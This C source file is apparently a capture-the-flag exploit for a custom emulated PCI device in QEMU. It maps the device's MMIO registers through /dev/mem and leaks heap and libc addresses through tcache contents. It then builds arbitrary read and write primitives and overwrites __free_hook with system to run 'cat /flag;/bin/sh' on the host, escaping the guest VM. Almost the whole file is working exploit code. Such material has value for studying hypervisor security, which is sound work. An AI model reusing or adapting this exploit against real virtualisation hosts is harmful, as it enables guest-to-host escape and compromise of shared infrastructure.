#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/types.h>

#define true 1
#define false 0

// Address of the mmio region in physical memory
#define MMIO_PHYSADDR 0xfebf1000
#define MMIO_DELETE_PHYSADDR (MMIO_PHYSADDR + offsetof(struct mmio, delete_req))
#define DMABUF_SIZE 0x1000
#define MMIO_SIZE 0x1000

volatile int result;

struct mmio {
    uint32_t size;
    uint32_t addr;
    uint32_t result_addr;
    uint32_t idx;
    uint32_t do_mmio;
    uint32_t create_req;
    uint32_t delete_req;
};

struct tcache {
    uint16_t counts[64];
    uint64_t entries[64];
};

static void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

static void hexdump8(uint64_t* buf, int len)
{
    assert(len % 0x8 == 0);
    for (int i = 1; i <= len / 8; i++) {
        printf("0x%016llx ", buf[i-1]);
        if (i % 0x2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
static uint64_t virt2phys(void* p, int has_to_be_present)
{
    uint64_t virt = (uint64_t)p;
    uint32_t saved_offset = virt & 0xfff;
    virt -= saved_offset;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert((!has_to_be_present) || phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys + saved_offset;
}

static del_req(volatile struct mmio *mmio)
{
    mmio->delete_req = 0;
}

static void mmio_read(volatile struct mmio *mmio, uint32_t dmabuf_physaddr, 
                      uint32_t idx, uint32_t result_physaddr, int wait)
{
    if (wait) {
        result = 0;
    }

    mmio->idx = idx;
    mmio->result_addr = result_physaddr;
    mmio->addr = dmabuf_physaddr - (idx << 10);
    uint32_t x = mmio->do_mmio;

    if (wait) {
      while (result != 2) {
          puts("Waiting...");
          sleep(1);
      }
    }
}

static void mmio_write(volatile struct mmio *mmio, uint32_t dmabuf_physaddr, 
                        uint32_t idx, uint32_t result_physaddr, int wait)
{
    if (wait) {
        result = 0;
    }

    mmio->idx = idx;
    mmio->result_addr = result_physaddr;
    mmio->addr = dmabuf_physaddr - (idx << 10);
    mmio->do_mmio = 1;
  
    if (wait) {
      while (result != 2) {
          printf("Waiting... %d \n", result);
          sleep(1);
      }
    }
}

static void alloc(volatile struct mmio *mmio, uint32_t size)
{
    mmio->size = size;
    mmio->create_req = 0;
}

static void dump(volatile struct mmio *mmio, uint64_t dmabuf_physaddr, 
                 volatile uint64_t* dmabuf, int idx) 
{
    alloc(mmio, 0x400*(idx+1));
    mmio_read(mmio, dmabuf_physaddr, idx,
              MMIO_DELETE_PHYSADDR, false);
    hexdump8(dmabuf, 0x400);
}

static void arb_read(volatile struct mmio *mmio, uint64_t dmabuf_physaddr,
                     uint64_t result_addr, volatile uint64_t* dmabuf, 
                     uint64_t where)
{
    mmio_read(mmio, dmabuf_physaddr, 0, result_addr, true);

    dmabuf[2] = where;

    mmio_write(mmio, dmabuf_physaddr, 0, result_addr, true);
    mmio_read(mmio, dmabuf_physaddr, 1, result_addr, true);
}

static void arb_write(volatile struct mmio *mmio, uint64_t dmabuf_physaddr,
                     uint64_t result_addr, volatile uint64_t* dmabuf, 
                     uint64_t where, uint64_t what)
{
    mmio_read(mmio, dmabuf_physaddr, 0, result_addr, true);

    dmabuf[2] = where;

    mmio_write(mmio, dmabuf_physaddr, 0, result_addr, true);

    mmio_read(mmio, dmabuf_physaddr, 1, result_addr, true);
    dmabuf[0] = what;

    mmio_write(mmio, dmabuf_physaddr, 1, result_addr, true);
}

int main(void)
{
    // mmio registers
    // int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", 
    //              O_RDWR | O_SYNC, 0);
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    assert(fd >= 0);

    volatile struct mmio *mmio = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE,
                                      MAP_SHARED, fd, MMIO_PHYSADDR);
    assert(mmio != MAP_FAILED);

    // Buffer for dma
    volatile uint8_t *dmabuf = mmap(0, DMABUF_SIZE, PROT_READ | PROT_WRITE, 
                                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    assert(dmabuf != MAP_FAILED);
    assert(mlock((void *)dmabuf, DMABUF_SIZE) == 0);
    assert(mlock((void *)&result, sizeof(result)) == 0);

    volatile uint64_t *dmabuf64 = (volatile uint64_t *)dmabuf;

    uint64_t dmabuf_physaddr = virt2phys((void *)dmabuf, true);
    uint64_t result_physaddr = virt2phys((void*)&result, true);

    #define NUM_BUFS 2

    // Read the contents of the tcache
    alloc(mmio, 0x400 * NUM_BUFS);
    mmio_read(mmio, dmabuf_physaddr, 0, MMIO_DELETE_PHYSADDR, false);
    
    hexdump8(dmabuf64, 0x400);

    uint64_t arena_leak = dmabuf64[98];
    uint64_t ptr_to_qemu = arena_leak + 0x48;

    struct tcache* tc = (struct tcache*)dmabuf;

    #define TCACHE_INDEX 63
    uint64_t req_address = tc->entries[TCACHE_INDEX];

    printf("Arena virt: %p \n", (void*)arena_leak);
    printf("Req address: %p \n", (void*)req_address);

    alloc(mmio, 0x400 * NUM_BUFS);
    memset(dmabuf, 0x0, 0x400);
    dmabuf64[0] = req_address;
    mmio_write(mmio, dmabuf_physaddr, 1, MMIO_DELETE_PHYSADDR, false);

    sleep(1);

    alloc(mmio, 0x400 * NUM_BUFS);

    /*
     * Trick is to have one of the bufs point to the req,
     * this way it is trivial to achieve arb read & write 
     * by simply overwriting the other pointer in the req list
     */
    dmabuf64[0] = 0x2000;
    dmabuf64[1] = req_address;
    dmabuf64[2] = req_address;
    memset(dmabuf+24, 0x41, 32);

    mmio_write(mmio, dmabuf_physaddr, 2, result_physaddr, true); 
    mmio_read(mmio, dmabuf_physaddr, 0, result_physaddr, true);

    arb_read(mmio, dmabuf_physaddr, result_physaddr, dmabuf64, arena_leak); 

    uint64_t qemu_base = dmabuf64[25] - 0xa70025;
    uint64_t getpid_GOT = qemu_base + 0x100de18;

    printf("Qemu base: %p \n", (void*)qemu_base);
    printf("Getpid GOT %p \n", (void*)getpid_GOT);

    arb_read(mmio, dmabuf_physaddr, result_physaddr, dmabuf64, getpid_GOT);

    uint64_t getpid = dmabuf64[0];
    uint64_t libc_base = getpid - 0xc2240;
    uint64_t system = libc_base + 0x30410;
    uint64_t free_hook = libc_base + 0x1c9b28;

    printf("libc base %p \n", (void*)libc_base);
    printf("system %p \n", (void*)system);
    printf("free_hook %p \n", (void*)free_hook);

    const char cmd[] = "cat /flag;/bin/sh";

    mmio_read(mmio, dmabuf_physaddr, 0, result_physaddr, true);

    // [1] = req->list[0] => will be the first to be freed
    dmabuf64[1] = free_hook - 0x18;

    mmio_write(mmio, dmabuf_physaddr, 0, result_physaddr, true);

    getchar();
    memcpy(dmabuf, cmd, sizeof(cmd));
    dmabuf64[3] = system;

    // write manually to prevent JIT recompile, which triggers free
    // gotta win race against JIT compilation
    mmio->do_mmio = 1;

    del_req(mmio);

    return 0;
}

